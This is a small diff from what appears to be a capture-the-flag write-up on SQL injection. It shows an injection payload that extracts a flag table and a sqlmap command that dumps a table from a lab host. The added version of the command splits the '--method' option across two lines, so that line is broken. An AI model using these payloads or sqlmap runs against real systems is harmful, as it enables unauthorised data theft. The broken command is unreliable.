@@ -46,6 +46,7 @@ title', (SELECT GROUP_CONCAT(flag) FROM sqli_five.flag));-- '
 # BLIND based INSERT
 
 ```bash
-sqlmap -u "https://89wtmldm.eu1.ctfio.com/" --data='name=test&email=test&message=test' --method POST --level 5 --risk 3 --batch --threads 10 --dbms=mysql --dump -T flag -D sqli_six
+sqlmap -u "https://89wtmldm.eu1.ctfio.com/" --data='name=test&email=test&message=test' --m  
+ethod POST --level 5 --risk 3 --batch --threads 10 --dbms=mysql --dump -T flag -D sqli_six
 ```
 
